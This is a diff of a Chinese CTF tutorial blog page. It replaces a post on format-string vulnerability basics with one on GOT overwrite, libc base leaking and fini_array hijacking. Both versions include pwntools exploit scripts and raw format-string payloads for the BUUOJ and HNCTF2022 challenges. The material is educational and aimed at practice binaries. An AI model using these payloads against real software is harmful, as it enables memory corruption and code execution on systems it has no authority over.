@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2022/09/22/格式化字符串漏洞/"/>
+  <link rel="canonical" href="http://example.com/2022/10/12/格式化字符串任意写-泄露基址/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -31,19 +31,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>格式化字符串漏洞 - Chen</title>
+  <title>格式化字符串任意写&泄露基址 - Chen</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="ChenBlog - Chen - Chen">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="格式化字符串漏洞">
-<meta property="og:url" content="http://example.com/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="格式化字符串任意写&amp;泄露基址">
+<meta property="og:url" content="http://example.com/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/index.html">
 <meta property="og:site_name" content="Chen">
-<meta property="og:description" content="格式化字符串漏洞原理printf应该是我们学习c语言起使用的最频繁的函数了 其语法我们熟悉的不能再熟悉了—&gt;printf (“格式化字符串”,参量… ) 我们可以写一段代码： 1234567#include &lt;stdio.h&gt;int main()&amp;#123;  int n&#x3D;5;  printf(&quot;%d&quot;,n);  return 0;&amp;#125;  当然我们也可">
+<meta property="og:description" content="本篇主要讲述两个知识点： 格式化字符串任意写和泄露基址 我们在最初的格式化字符串漏洞学习中 已经掌握了查看偏移和篡改地址的数据的能力 但是如果是篡改puts函数的got表呢？ 我们知道 动态链接的情况下 当我们调用一个函数时 他会寻址其got表内存储的真实地址(即对应函数在libc文件中的地址) 从而成功调用 如果我们将其got表内存储的真实地址修改为其他函数的真实地址 那么当程序调用原函数时 就">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-09-22T13:55:33.000Z">
-<meta property="article:modified_time" content="2022-09-23T09:14:29.157Z">
+<meta property="article:published_time" content="2022-10-12T02:25:53.000Z">
+<meta property="article:modified_time" content="2022-10-12T05:25:08.173Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1626,7 +1626,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1665330176176),
+    lastupdate: new Date(1665552326974),
     sidebar: {
       for_page: ["blogger","category","tagcloud","text"],
       for_post: ["toc"],
@@ -2362,7 +2362,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/22/格式化字符串漏洞/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/12/格式化字符串任意写-泄露基址/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Chen">
   </span>
@@ -2383,7 +2383,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        格式化字符串漏洞
+        格式化字符串任意写&泄露基址
       </h1>
       <div class='new-meta-box'>
         
@@ -2414,10 +2414,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-09-22T21:55:33+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-10-12T10:25:53+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Sep 22, 2022</p>
+    <p>发布于：Oct 12, 2022</p>
   </a>
 </div>
 
@@ -2440,99 +2440,70 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>printf应该是我们学习c语言起使用的最频繁的函数了</p>
-<p>其语法我们熟悉的不能再熟悉了—&gt;<strong>printf (“格式化字符串”,参量… )</strong></p>
-<p>我们可以写一段代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n=<span class="number">5</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <p>本篇主要讲述两个知识点： 格式化字符串任意写和泄露基址</p>
+<p>我们在最初的格式化字符串漏洞学习中 已经掌握了查看偏移和篡改地址的数据的能力</p>
+<p>但是如果是篡改puts函数的got表呢？</p>
+<p>我们知道 动态链接的情况下 当我们调用一个函数时</p>
+<p>他会寻址其got表内存储的真实地址(即对应函数在libc文件中的地址) 从而成功调用</p>
+<p>如果我们将其got表内存储的真实地址修改为其他函数的真实地址</p>
+<p>那么当程序调用原函数时 就相当于调用了篡改后的函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(offset, &#123;puts_got:system_addr &#125;)</span><br></pre></td></tr></table></figure>
 
-<p>当然我们也可以这样写：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> a[]=<span class="string">&quot;chen&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以上述payload为例 假设我们需要修改puts函数的got表 使其为system函数的地址</p>
+<p>那么我们就可以这样构造payload(这里注意一下，fmtstr这个工具是会自己补齐字长的 这将影响到我们下文中一道例题 现在留个意就行了)</p>
+<p>ps:并且这个工具默认生成的是32位情况下 如果需要切换到64位 需要自己手动添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch = &quot;amd64&quot;</span><br></pre></td></tr></table></figure>
 
-<p>第二种写法虽然没有格式化字符但是仍然可以输出chen这个字符串</p>
-<p>那我们再看看第三种写法</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> a[]=<span class="string">&quot;%x%x%x&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是一般题目除非出题人好心 不然真实地址还是得我们自己泄露的吧</p>
+<p>那如何一并利用格式化字符串泄露函数的真实地址呢？</p>
+<p>还记不记得 格式化字符串最开始的漏洞利用 就是泄露栈上的内容 如果我们将got表写入栈上 那是不是也可以通过格式化字符串漏洞将其泄露出来？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%n$s&quot;</span>.ljust(<span class="number">16</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(puts_got)</span><br></pre></td></tr></table></figure>
 
-<p>这次我们没有给printf函数参数，只是仅仅给他格式化字符，猜一下，这次能成功吗，如果成功了，会输出什么？</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IsjzF"><img src="https://s1.328888.xyz/2022/09/22/IsjzF.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/22/IsjzF.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="IsjzF.png"></a></p>
-<p>输出了像地址的16进制？</p>
-<p>我们明明没有给他用以输出的参数，那么这串数据是从哪里来的？</p>
-<p>我们用图来表示一下printf输出的时候栈结构是什么样子</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IssF7"><img src="https://s1.328888.xyz/2022/09/22/IssF7.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/22/IssF7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="IssF7.png"></a></p>
-<p><strong>ps:关于这图，格式化字符串不一定要放在栈顶才能实现任意地址写入，注意别被误导了，下面会提一嘴</strong></p>
-<p>如果我们只传入了格式化字符串而没有传入参数</p>
-<p>那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出当前栈的内容&#x2F;指针(输出的方式根据其格式化字符的不同而不同)</p>
-<p><strong>这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束</strong></p>
-<p>pwn题中的格式化字符串通常有两种出法</p>
-<p>第一种，使用格式化字符串泄露栈上的内容(canary或者是随机数不一定)，由于wp分类中的HUBU2022.fmt已经是这方面的例题了，这里不做额外的讲解，感兴趣的可以去wp分区中自行查看</p>
-<p>第二种，也是难度较前者稍高，不好理解的一种</p>
-<h2 id="任意内存的读取及任意内存写入"><a href="#任意内存的读取及任意内存写入" class="headerlink" title="任意内存的读取及任意内存写入"></a>任意内存的读取及任意内存写入</h2><p>我们首先得了解一个不常用的格式化字符串**%n**</p>
-<p>他的作用是将在其之前打印出来的字节数赋值给指定的变量</p>
-<p>比如: AAAA%n 就会赋值4给变量</p>
-<p>如果我们后面跟上要修改的变量地址，就可以做到任意地址的写入</p>
-<p>没懂？没关系来看一道例题</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IUys5"><img src="https://s1.328888.xyz/2022/09/23/IUys5.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/23/IUys5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="IUys5.png"></a></p>
-<p>开了canary保护，大概率是格式化字符串</p>
-<p>看看ida</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有几点要注意一下 一个是n 注意是地址所在的偏移</p>
+<p>还有一点是格式化字符这里选择的是s </p>
+<p>最后一个疑惑在于为什么要用\x00补齐16个字节 这个我也不懂 死记就完事了(你也可以试试不补齐 然后看会泄露个啥出来)</p>
+<p>好了 接下来用一题例题来演示一下 方便理解(例题还涉及到了fini劫持的知识点 不懂的话建议先去看另外一篇)</p>
+<h2 id="HNCTF2022-WEEK2-fmtstr-level2"><a href="#HNCTF2022-WEEK2-fmtstr-level2" class="headerlink" title="HNCTF2022-[WEEK2]fmtstr_level2"></a>HNCTF2022-[WEEK2]fmtstr_level2</h2><p>附件有给libc文件 猜测要用到泄露基址</p>
+<p>checksec看一下进制和保护</p>
+<p><img src="https://s1.328888.xyz/2022/10/12/8j0jj.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/10/12/8j0jj.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="8j0jj.png"></p>
+<p>有canary 要么泄露绕过 要么就不能栈溢出了</p>
+<p>再看一下程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">296</span>]; <span class="comment">// [rsp+0h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the game of formatting strings&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Be careful, you only get one shot at this game&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;First please tell me your game ID&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Okk,try to hack it;sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这里的&#x2F;dev&#x2F;urandom是什么？</p>
-<p>我们只需要了解他是linux系统中的随机伪设备，他的作用就是提供永不为空的随机字节流</p>
-<p>浅看一下他生成的字节流长什么样子</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IxFMw"><img src="https://s1.328888.xyz/2022/09/23/IxFMw.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/23/IxFMw.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="IxFMw.png"></a></p>
-<p>说回这道题，看逻辑应该是要我们输入这个随机数，如果一样就调用system(&#x2F;bin&#x2F;sh)</p>
-<p>而存放这个随机数的就是dword_804C044的地址</p>
-<p>那我们这时候应该有两种想法，一种是泄露这个随机数，输入他</p>
-<p>还有一种是通过修改这个随机数的值来判定成功</p>
-<p>第一种办法本人是没法做出来，感兴趣的可以试一试</p>
-<p>那么讲一下第二种办法，由上文的学习我们已经知道</p>
-<p>要想用格式化字符串漏洞泄露栈上的内容，需要我们知道目标地址和格式化字符串存放的地址的偏移</p>
-<p>用gdb看一下偏移</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/Ix5SC"><img src="https://s1.328888.xyz/2022/09/23/Ix5SC.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/23/Ix5SC.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Ix5SC.png"></a></p>
-<p>现在main函数处设置一个断点(这里由于main函数被删符号表了，所以b main的话gdb查找不到函数的，删符号表的体现就是在ida中main函数不是粗体字，ida只是凭借逻辑识别他为main函数)</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IxoJB"><img src="https://s1.328888.xyz/2022/09/23/IxoJB.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/23/IxoJB.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="IxoJB.png"></a></p>
-<p>接着运行并且跳转到输入字符串这边，我们先输入8个A看一下栈分布的情况</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IxV3P"><img src="https://s1.328888.xyz/2022/09/23/IxV3P.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/23/IxV3P.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="IxV3P.png"></a></p>
-<p>这里还是先解释一下x&#x2F;20wx $esp这个命令是什么意思</p>
-<p>其作用是用gdb查看内存 格式: x &#x2F;n u f <addr > </p>
-<p>n是要显示的内存单元个数</p>
-<p>f表示显示方式, 可取如下值</p>
-<p>u表示一个地址单元的长度</p>
-<p>这里的x&#x2F;20wx 的意思就是说查看20个4字节长度的内存单元 并且按16进制的格式显示</p>
-<p>至于为什么是以esp为初始地址显示</p>
-<p><strong>是因为格式化字符串%n进行任意地址改写是在ESP所指向的地址处所指向的地址处写入数据(可以理解为栈顶)</strong></p>
-<p>所以我们需要知道当我们最终构造的payload中需要改写的地址内容距离esp的偏移是多少</p>
-<p>而且也正是因为这一点，决定了我们可以不用一定要把格式化字符串放在栈顶</p>
-<p>这里可以看到代表着AAAAAAAA的两个0x4141414141距离esp的偏移是10和11(如果我们只输入4个A只会占用偏移10这个字长，因为这是32位程序，等下编写exp的不要被搞晕了)</p>
-<p>所以此时我们要如何构造我们的payload？</p>
-<p>此时我们将格式化字符放在payload的最后</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25117</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">addr = <span class="number">0x0804C044</span></span><br><span class="line">payload = p32(addr)+<span class="string">b&quot;%10$n&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>唯一看起来有价值的就只有main函数了 没有任何的后门函数 甚至buf的字节也不够栈溢出</p>
+<p>但是注意看 最后的puts输出的字符串有sh</p>
+<p>那么可以猜测出题目的解法是修改got表</p>
+<p>结果我们只有一次格式化字符串任意写的机会 好像并不能满足泄露地址后再修改got表的需求</p>
+<p>但是如果我们将fini_array的值改为main函数 那么程序结束后 就会重新返回到main函数 那么我们就有了第二次利用格式化字符串的机会</p>
+<p>于是解题思路可以分为两步</p>
+<p>1.修改fini_array和泄露函数真实地址</p>
+<p>2.将puts_got修改为system函数</p>
+<p>那么接下来开始编写exp</p>
+<p>gdb查看了偏移以后 发现我们输入的第一个字长的数据位于偏移6的地方</p>
+<p>第一个payload的难点在于搞清楚两个格式化字符串的偏移和payload的结构</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;fini_addr:main_addr&#125;)</span><br><span class="line">payload += <span class="string">b&quot;%17$s&quot;</span>.ljust(<span class="number">16</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(puts_got)  //<span class="number">6</span>+<span class="number">8</span>（第一行payload字节数<span class="number">64</span>）+<span class="number">2</span>+<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p>由于此时程序是32位，%n前面传入的p32(addr)则为一个字长，四个字节，所以此时addr处的随机数就被我们修改为4</p>
-<p>我们接着再输入4，就成功破解了随机数</p>
-<p>学会了？觉得很简单？再来看一个比较绕的exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25117</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">addr = <span class="number">0x0804C044</span></span><br><span class="line">payload = <span class="string">b&quot;AAAAAAA%13$n&quot;</span>+p32(addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;7&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>按照我们上文所说的是不是应该这么构造payload 但是你会发现最后泄露出来的地址是</p>
+<p><img src="https://s1.328888.xyz/2022/10/12/80LAP.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/10/12/80LAP.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="80LAP.png"></p>
+<p>aaaaba+fini_array的地址(0x4031f0)</p>
+<p>前面的aaaaba是什么东西？</p>
+<p>我们打印出fmtstr构造的数据看看</p>
+<p><img src="https://s1.328888.xyz/2022/10/12/80a9h.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/10/12/80a9h.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="80a9h.png"></p>
+<p>可以看到aaaaba出自这里 这里就是我们上文所说到的fmtstr的自动补齐一个字长</p>
+<p>而后面的\x00也是为了传送地址(但是地址只有三字节 所以需要5个\x00才补齐一个字长)</p>
+<p>那么说回我们刚才的错误 其原因在于我们需要将格式化字符串放在一起 地址放在一起</p>
+<p>才能两次利用一个漏洞点</p>
+<p>所以 正确的payload应该把aaaaba替换成泄露地址的格式化字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\xf01@\x00\x00\x00\x00\x00\xf11@\x00\x00\x00\x00\x00\xf21@\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(puts_got)</span><br></pre></td></tr></table></figure>
 
-<p>这次我们把addr放在后面传输了，可以看到和上文的区别是前面多了7个A而且这次随机数被我们修改成7了</p>
-<p>看不懂没关系，接下来详解</p>
-<p>我们再次明确一下概念，这里提到的偏移指的是距离esp的字长数</p>
-<p>那么我们要实现改写的是addr这个地址的随机数对吧</p>
-<p>此时我们先传入的是字符串“AAAAAAA%13$n”他的字节数是多少？</p>
-<p>很明显是12个字节，也就是三个字长</p>
-<p>我们之前通过gdb已经明白了，我们写入栈中的第一个字长是位于10偏移处，也就是AAAA</p>
-<p>那么接下里的AAA%就会被写入11偏移</p>
-<p>13$n就会被写入12偏移</p>
-<p>而此时的addr就会被存放在13偏移处，所以此时我们的n就要从10更改为13</p>
-<p>似乎有点能理解了是吧？</p>
-<p>实际上pwntools中有一个函数，他可以自动帮我们生成这样的payload，而我们要做到的只是给予他基本的参数</p>
-<p><strong>fmtstr_payload(offset, {addr: data})</strong></p>
-<p>offset就是我们需要更改内容的地址距离esp的偏移</p>
-<p>addr就是我们需要改写内容的地址</p>
-<p>data就是我们需要改写的数据</p>
-<p>来看一下接下来的exp可以怎么写</p>
